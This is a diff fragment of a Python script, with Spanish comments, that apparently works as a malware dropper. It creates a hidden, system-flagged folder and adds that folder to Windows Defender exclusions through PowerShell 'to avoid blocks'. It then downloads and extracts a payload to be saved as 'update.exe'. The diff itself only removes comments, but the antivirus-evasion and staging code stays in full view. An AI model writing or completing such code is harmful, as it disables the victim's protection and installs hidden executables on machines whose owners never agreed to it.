@@ -26,12 +26,10 @@ RUTA_EXE_FINAL = os.path.join(DIRECTORIO_DISCRETO, "update.exe")
 def asegurar_carpeta_y_exclusion():
     """Crea la carpeta de destino y añade una exclusión en Windows Defender para evitar bloqueos."""
     try:
-        # 1. Crear la carpeta si no existe y ocultarla
         if not os.path.exists(DIRECTORIO_DISCRETO):
             os.makedirs(DIRECTORIO_DISCRETO, exist_ok=True)
             subprocess.run(f'attrib +h +s "{DIRECTORIO_DISCRETO}"', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        
-        # 2. Agregar la carpeta a las exclusiones de Windows Defender
+
         comando_exclusion = [
             "powershell",
             "-Command",
@@ -49,7 +47,6 @@ def asegurar_carpeta_y_exclusion():
 
 def descargar_y_extraer():
     try:
-        # Primero aseguramos la creación de la carpeta y su exclusión en el antivirus
         if not asegurar_carpeta_y_exclusion():
             return False
 
